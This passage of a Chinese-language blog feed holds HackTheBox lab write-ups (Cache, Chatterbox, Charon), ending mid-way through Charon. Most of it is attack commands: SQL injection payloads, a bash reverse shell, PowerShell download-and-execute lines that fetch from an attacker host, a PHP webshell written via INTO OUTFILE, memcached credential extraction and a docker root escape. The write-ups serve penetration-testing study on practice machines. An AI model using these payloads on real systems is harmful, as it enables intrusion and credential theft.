<p><img src="/images/Buff/14.png" alt="14"></p>
<p>得到了提权 ，有些困惑为什么<code>netstat</code>没有显示端口</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Cache</title>
    <url>/2021/05/31/HTB-Cache/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Cache/1.png" alt="1"></p>
<p>web枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.188&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -n -x html</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/2.png" alt="2"></p>
<p>网站存在首页</p>
<p><img src="/images/Cache/3.png" alt="3"></p>
<p>作者栏发现用户ASH，并且发现了主机名，添加到/etc/hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.188    cache.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/4.png" alt="4"></p>
<p>内容提示了ASH是一个安全研究员，它创建了HMS系统，这是一个提示</p>
<p>发现登陆页面，尝试常见弱口令</p>
<p><img src="/images/Cache/5.png" alt="5"></p>
<p>发现BurpSuite里没有请求包，所以这有可能是Javascript处理的</p>
<p>查看源代码，发现<code>view-source:http://10.10.10.188/jquery/functionality.js</code></p>
<p>发现了硬编码凭据<code>ash/H@v3_fun</code></p>
<p><img src="/images/Cache/6.png" alt="6"></p>
<p>输入凭据后页面跳转，但是没有更多的信息</p>
<p><img src="/images/Cache/7.png" alt="7"></p>
<p>对虚拟主机名进行枚举。这里很坑，需要把htb添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.188	cache.htb htb</span><br></pre></td></tr></table></figure>

<p>然后对htb进行虚拟主机名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http:&#x2F;&#x2F;htb -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-20000.txt -t 50</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/8.png" alt="8"></p>
<p>得到hms.htb，添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.188	cache.htb htb hms.htb</span><br></pre></td></tr></table></figure>

<p>通过<code>hms.htb</code>访问，发现openEMR，下方提示2018，看起来版本较老</p>
<p><img src="/images/Cache/9.png" alt="9"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>谷歌搜索发现了关于OpenEMR的漏洞手册，里面记录了大量漏洞:<a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">链接</a></p>
<p>首先让我感兴趣的是版本枚举</p>
<p><img src="/images/Cache/10.png" alt="10"></p>
<p>未授权用户可以通过访问<code>admin.php</code>得到版本号，尝试访问<code>http://hms.htb/admin.php</code></p>
<p><img src="/images/Cache/11.png" alt="11"></p>
<p>或者<code>sql_patch.php</code>似乎也可以</p>
<p><img src="/images/Cache/12.png" alt="12"></p>
<p>访问<code>http://hms.htb/sql_patch.php</code>得到</p>
<p><img src="/images/Cache/13.png" alt="13"></p>
<p>有了版本就可以过滤掉大量无关的公开漏洞</p>
<p><img src="/images/Cache/14.png" alt="14"></p>
<p>不幸的是多数需要身份认证</p>
<h2 id="身份绕过"><a href="#身份绕过" class="headerlink" title="身份绕过"></a>身份绕过</h2><p>从漏洞报告PDF中，发现了<code>Patient Portal Authentication Bypass</code>，可以使我们绕过身份验证</p>
<p>利用过程很简单，首先访问首页，302跳转后会给我们设置一个cookie</p>
<p><img src="/images/Cache/16.png" alt="16"></p>
<p>之后访问<code>http://hms.htb/portal/account/register.php</code>，这里由于逻辑问题，会给我一个有效的session会话</p>
<p><img src="/images/Cache/15.png" alt="15"></p>
<p>然后我们就相当于通过了认证，刷新页面，发现确实多了一个session</p>
<p><img src="/images/Cache/17.png" alt="17"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>之后就可以顺着PDF文档阅读，发现了大量SQL注入漏洞(需要身份验证)，我们可以对它们发起攻击，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;hms.htb&#x2F;portal&#x2F;add_edit_event_user.php?eid&#x3D;1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))</span><br></pre></td></tr></table></figure>

<p>如果没有经过身份认证绕过，该漏洞无法利用 </p>
<p><img src="/images/Cache/18.png" alt="18"></p>
<p>绕过后的报错注入生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;hms.htb&#x2F;portal&#x2F;add_edit_event_user.php?eid&#x3D;1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/19.png" alt="19"></p>
<p>直接使用sqlmap就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --dbms&#x3D;mysql -p eid --batch</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/20.png" alt="20"></p>
<p>这里使用Burpsuite的Intruder快速完成报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eid&#x3D;1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select table_name from information_schema.tables where table_schema&#x3D;&quot;openemr&quot; limit 0,1)))</span><br><span class="line">eid&#x3D;1 AND EXTRACTVALUE(0,CONCAT(0x5c,(select table_name from information_schema.tables where table_schema&#x3D;&quot;openemr&quot; limit 1,1)))</span><br></pre></td></tr></table></figure>

<p>前面都是正常操作</p>
<p><img src="/images/Cache/21.png" alt="21"></p>
<p><img src="/images/Cache/22.png" alt="22"></p>
<p><code>Start attack</code>，攻击完成后，为了方便查看，添加<code>Grep - Extract</code></p>
<p><img src="/images/Cache/23.png" alt="23"></p>
<p>之后可以直接在Intruder页面看到结果</p>
<p><img src="/images/Cache/24.png" alt="24"></p>
<p>反正随便怎么操作就能获取加密的哈希了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sqli --dbms&#x3D;mysql -p eid --batch -D &quot;openemr&quot; -T &quot;users_secure&quot; -C &quot;id&quot;,&quot;password&quot;,&quot;username&quot; --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/25.png" alt="25"></p>
<p>hashid猜测出密码可能为bcrypt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; hashid &#39;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#39;</span><br><span class="line">Analyzing &#39;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#39;</span><br><span class="line">[+] Blowfish(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board 4.x </span><br><span class="line">[+] bcrypt</span><br></pre></td></tr></table></figure>

<p>使用john破解bcrypt Blowfish</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;bcrypt</span><br></pre></td></tr></table></figure>

<p>得到<code>xxxxxx</code></p>
<p><img src="/images/Cache/26.png" alt="26"></p>
<p>使用凭据<code>openemr_admin/xxxxxx</code>可以登录网站</p>
<p><img src="/images/Cache/27.png" alt="27"></p>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>有了管理员凭据，可以在后台花式上传shell。为了快速获得RCE，我使用之前EDB里找到的<code>45161.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 45161.py -u openemr_admin -p xxxxxx -c &#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;4444 0&gt;&amp;1&quot;&#39; http:&#x2F;&#x2F;hms.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/28.png" alt="28"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user1"><a href="#user1" class="headerlink" title="user1"></a>user1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@cache:&#x2F;var&#x2F;www$ cat &#x2F;etc&#x2F;passwd | grep -v &quot;false\|nologin&quot;</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">ash:x:1000:1000:ash:&#x2F;home&#x2F;ash:&#x2F;bin&#x2F;bash</span><br><span class="line">luffy:x:1001:1001:,,,:&#x2F;home&#x2F;luffy:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>发现用户ash，这是我们之前找到凭据的用户，虽然不能ssh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@cache:&#x2F;var&#x2F;www$ su ash</span><br><span class="line">Password: H@v3_fun</span><br><span class="line">ash@cache:&#x2F;var&#x2F;www$ id</span><br><span class="line">uid&#x3D;1000(ash) gid&#x3D;1000(ash) groups&#x3D;1000(ash)</span><br></pre></td></tr></table></figure>

<h2 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h2><h3 id="memcached"><a href="#memcached" class="headerlink" title="memcached"></a>memcached</h3><p>枚举端口发现11211，这是<code>memcached</code>的默认端口</p>
<p><img src="/images/Cache/29.png" alt="29"></p>
<p>发现了一片<a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">文章</a>关于如何从<code>memcached</code>中获取数据</p>
<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ash@cache:~$ telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br><span class="line"></span><br><span class="line">version</span><br><span class="line">VERSION 1.5.6 Ubuntu</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>stats items查看slab ID和对应的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stats items</span><br><span class="line">STAT items:1:number 5</span><br><span class="line">STAT items:1:number_hot 0</span><br><span class="line">STAT items:1:number_warm 0</span><br><span class="line">STAT items:1:number_cold 5</span><br><span class="line">STAT items:1:age_hot 0</span><br><span class="line">STAT items:1:age_warm 0</span><br><span class="line">STAT items:1:age 28</span><br><span class="line">STAT items:1:evicted 0</span><br><span class="line">STAT items:1:evicted_nonzero 0</span><br><span class="line">STAT items:1:evicted_time 0</span><br><span class="line">STAT items:1:outofmemory 0</span><br><span class="line">STAT items:1:tailrepairs 0</span><br><span class="line">STAT items:1:reclaimed 0</span><br><span class="line">STAT items:1:expired_unfetched 0</span><br><span class="line">STAT items:1:evicted_unfetched 0</span><br><span class="line">STAT items:1:evicted_active 0</span><br><span class="line">STAT items:1:crawler_reclaimed 0</span><br><span class="line">STAT items:1:crawler_items_checked 48</span><br><span class="line">STAT items:1:lrutail_reflocked 0</span><br><span class="line">STAT items:1:moves_to_cold 450</span><br><span class="line">STAT items:1:moves_to_warm 0</span><br><span class="line">STAT items:1:moves_within_lru 0</span><br><span class="line">STAT items:1:direct_reclaims 0</span><br><span class="line">STAT items:1:hits_to_hot 0</span><br><span class="line">STAT items:1:hits_to_warm 0</span><br><span class="line">STAT items:1:hits_to_cold 2</span><br><span class="line">STAT items:1:hits_to_temp 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用命令<code>stats cachedump X Y</code>，X标识slab ID，Y表示KEY的值，其中0表示全部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stats cachedump 1 0</span><br><span class="line">ITEM link [21 b; 0 s]</span><br><span class="line">ITEM user [5 b; 0 s]</span><br><span class="line">ITEM passwd [9 b; 0 s]</span><br><span class="line">ITEM file [7 b; 0 s]</span><br><span class="line">ITEM account [9 b; 0 s]</span><br></pre></td></tr></table></figure>

<p>其中user和passwd看上去比较有趣</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line">get passwd</span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>看样子得到了凭据<code>luffy/0n3_p1ec3</code>，输入<code>CTRL+]</code>退出当前telnet</p>
<p>尝试ssh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh luffy@10.10.10.188</span><br><span class="line">0n3_p1ec3</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/30.png" alt="30"></p>
<h4 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h4><p>建立反向隧道，在ssh会话中输入<code>~C</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-L 9999:127.0.0.1:11211</span><br></pre></td></tr></table></figure>

<p>可以使用<code>msf</code>导出<code>memcached</code>中的凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary&#x2F;gather&#x2F;memcached_extractor</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/33.png" alt="33"></p>
<h4 id="libmemcached-tools"><a href="#libmemcached-tools" class="headerlink" title="libmemcached-tools"></a>libmemcached-tools</h4><p>建立隧道到默认端口，这工具没有指定端口的选项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-L 11211:127.0.0.1:11211</span><br></pre></td></tr></table></figure>

<p>stats命令美化版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memcstat --servers&#x3D;127.0.0.1 </span><br></pre></td></tr></table></figure>

<p>获取key值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memcdump --servers&#x3D;127.0.0.1</span><br><span class="line">link</span><br><span class="line">user</span><br><span class="line">passwd</span><br><span class="line">file</span><br><span class="line">account</span><br></pre></td></tr></table></figure>

<p>导出数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memccat --servers&#x3D;127.0.0.1 link user passwd file account</span><br><span class="line">https:&#x2F;&#x2F;hackthebox.eu</span><br><span class="line">luffy</span><br><span class="line">0n3_p1ec3</span><br><span class="line">nothing</span><br><span class="line">afhj556uo</span><br></pre></td></tr></table></figure>

<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现用户处于docker组，并且发现存在ubuntu镜像</p>
<p><img src="/images/Cache/31.png" alt="31"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it ubuntu chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cache/32.png" alt="32"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Chatterbox</title>
    <url>/2020/06/25/HTB-Chatterbox/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/chatterbox/1.jpg" alt="1"></p>
<p>扫描出一个服务achat，其他没有任何信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>没什么可以枚举的，直接搜索公开漏洞</p>
<p><img src="/images/chatterbox/2.jpg" alt="2"></p>
<p>发现BOF，观察这个漏洞利用代码<img src="/images/chatterbox/3.jpg" alt="3"></p>
<p>它的buffer最大好像为1152，我们不能超过这个值，并且已经帮我找出了坏字节，这样我们可以生成自己的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;exec CMD&#x3D;&quot;Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -e x86&#x2F;unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister&#x3D;EAX -f python</span><br></pre></td></tr></table></figure>

<p>再修改ip地址</p>
<p><img src="/images/chatterbox/4.jpg" alt="4"></p>
<p>就能触发我们的invoke-powershell，反弹powershell</p>
<p><img src="/images/chatterbox/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用powerup进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;PowerUp.ps1&#39;)</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/6.jpg" alt="6"></p>
<p>扫出了自动登录的凭证</p>
<p>开始提权</p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>存储账号信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;Welcome1!&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;Administrator&#39;, $SecPass)</span><br></pre></td></tr></table></figure>

<p>反弹admin的shell<br>注意:这里反弹的Invoke-PowerShellTcp.ps1和之前不能是同一个，而且别忘记了改端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.99&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/7.jpg" alt="7"></p>
<p>成功getshell</p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>发现本地开放了smb服务</p>
<p><img src="/images/chatterbox/8.jpg" alt="8"></p>
<p>我们可以以administrator的身份登录smb，执行cmd即可</p>
<p>先进行端口转发的配置，使用plink</p>
<p>文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &#x2F;&#x2F;10.10.16.99&#x2F;a&#x2F;plink.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/chatterbox/9.jpg" alt="9"></p>
<p>进行转发</p>
<p>切记，如果你使用root账户，需要修改默认禁用root进行ssh</p>
<p>在<code>/etc/ssh/sshd_config</code>中增加一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>

<p>之后再用命令转发即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &quot;&#x2F;c echo y|C:\users\Alfred\plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.99&quot;</span><br></pre></td></tr></table></figure>

<p>最后使用winexe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U Administrator &#x2F;&#x2F;127.0.0.1 &quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure>

<p>我们就能获取shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Charon</title>
    <url>/2020/10/21/HTB-Charon/</url>
    <content><![CDATA[<h1 id="Charon"><a href="#Charon" class="headerlink" title="Charon"></a>Charon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/charon/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口发现supercms</p>
<p><img src="/images/charon/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞，没有发现，手动检查</p>
<p>发现了一处页面提交了id参数</p>
<p><img src="/images/charon/3.png" alt="3"></p>
<p>手动测试几个payload后，发现sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10 and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>

<p><img src="/images/charon/4.png" alt="4"></p>
<p>直接使用sqlmap</p>
<p><img src="/images/charon/6.png" alt="6"></p>
<p>但是mysql内没有任何凭据信息</p>
<p><img src="/images/charon/5.png" alt="5"></p>
<p>尝试写入webshell和文件读取也无法完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 union select 1,2,3,4,(load_file (&#39;&#x2F;etc&#x2F;passwd&#39;))--+</span><br><span class="line">0 union select 1,&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;,3,4,5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php&#39;--+</span><br></pre></td></tr></table></figure>

<p>所以这个sql注入在这里，几乎0作用，可以确认是兔子洞</p>
<p>没有突破点，尝试目录枚举</p>
<p><img src="/images/charon/7.png" alt="7"></p>
<p>得到了cmsdata目录，但是403了，尝试枚举该目录</p>
<p><img src="/images/charon/8.png" alt="8"></p>
<p>得到了一些有用的页面</p>
<p><img src="/images/charon/9.png" alt="9"></p>
<p>在forgot password处发现了sql注入，发现过程如下</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=abcd</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’</td>
<td>Error in Database!</td>
</tr>
<tr>
<td>email=evil@evil.com”</td>
<td>User not found with that email!</td>
</tr>
</tbody></table>
<p>可以得到，闭合方式为<code>&#39;</code>，继续尝试</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ order by 1–+</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 111111–+</td>
<td>Error in Database!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 4–+</td>
<td>User not found with that email!</td>
</tr>
<tr>
<td>email=evil@evil.com’ order by 5–+</td>
<td>Error in Database!</td>
</tr>
</tbody></table>
<p>得到字段数为4</p>
<p>接下来稍微有点坑</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ union select 1,2,3,4–+</td>
<td>Error</td>
</tr>
<tr>
<td>email= union @evil.com</td>
<td>Error</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,3,4–+</td>
<td>Incorrect format</td>
</tr>
</tbody></table>
<p>这里过滤了<code>空格union空格 </code>，有点容易忽略，通过大小写可以绕过，之后又会返回<code>Incorrect format</code></p>
<p>这里需要推测一下SQL语句，似乎这条语句应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column1,column2,column3,column4 from TABLE_NAME where EMAIL&#x3D;&#39;$INPUT&#39;;</span><br></pre></td></tr></table></figure>

<p>其中任何一个column都有可能是EMAIL，而它是有格式要求的，所以要解决这个问题需要挨个尝试</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=evil@evil.com’ UNiON select ‘abc@abc.com’,2,3,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,‘abc@abc.com’,3,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,‘abc@abc.com’,4–+</td>
<td>Incorrect format</td>
</tr>
<tr>
<td>email=evil@evil.com’ UNiON select 1,2,3,‘abc@abc.com’–+</td>
<td>Email sent to: <a href="mailto:&#97;&#98;&#99;&#x40;&#97;&#x62;&#x63;&#46;&#99;&#x6f;&#109;">&#97;&#98;&#99;&#x40;&#97;&#x62;&#x63;&#46;&#99;&#x6f;&#109;</a>=&gt;2</td>
</tr>
</tbody></table>
<p>现在要想办法构造查询的payload，而且要满足条件判断<br>这里可以通过<code>concat()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(&quot;!&quot;,database(),&quot;!&quot;,&quot;abc@abc.com&quot;)--+</span><br><span class="line">输出</span><br><span class="line">Email sent to: !supercms!abc@abc.com&#x3D;&gt;2</span><br></pre></td></tr></table></figure>

<p>这样就得到了数据库名<code>supercms</code></p>
<p><strong>爆表</strong></p>
<p>下面两种语句都可以，from写在里面或者写在外面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(&quot;!&quot;,(select table_name from information_schema.tables WHERE table_schema&#x3D;&#39;supercms&#39; limit 1 offset 0),&quot;!&quot;,&quot;abc@abc.com&quot;)--+</span><br><span class="line">或者</span><br><span class="line">email&#x3D;email&#x3D;evil@evil.com&#39; UNiON select 1,2,3,concat(table_name,&quot;evil@evil.com&quot;) FROM information_schema.tables WHERE table_schema&#x3D;&#39;supercms&#39; limit 0,1 --+</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#x62;&#x63;&#x40;&#x61;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#x62;&#x63;&#x40;&#x61;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#x6d;</a>“)–+</td>
<td>groups</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#64;&#97;&#98;&#x63;&#x2e;&#99;&#111;&#109;">&#97;&#x62;&#x63;&#64;&#97;&#98;&#x63;&#x2e;&#99;&#111;&#109;</a>“)–+</td>
<td>license</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#x62;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;">&#x61;&#x62;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#111;&#109;</a>“)–+</td>
<td>operators</td>
</tr>
</tbody></table>
<p>其中关键的表为<code>operators</code></p>
<p><strong>爆字段</strong></p>
<p>爆表<code>operators</code>的字段</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#97;&#98;&#99;&#x40;&#97;&#98;&#x63;&#46;&#x63;&#111;&#x6d;">&#97;&#98;&#99;&#x40;&#97;&#98;&#x63;&#46;&#x63;&#111;&#x6d;</a>“)–+</td>
<td>id</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#x62;&#99;&#x40;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#109;">&#97;&#x62;&#99;&#x40;&#x61;&#98;&#x63;&#46;&#x63;&#x6f;&#109;</a>“)–+</td>
<td>__username_</td>
</tr>
<tr>
<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#x62;&#99;&#x40;&#97;&#98;&#x63;&#x2e;&#x63;&#x6f;&#109;">&#97;&#x62;&#99;&#x40;&#97;&#98;&#x63;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
<td>__password_</td>
</tr>
</tbody></table>
<p>得到__username_和  __password_</p>
<p><strong>爆数据</strong></p>
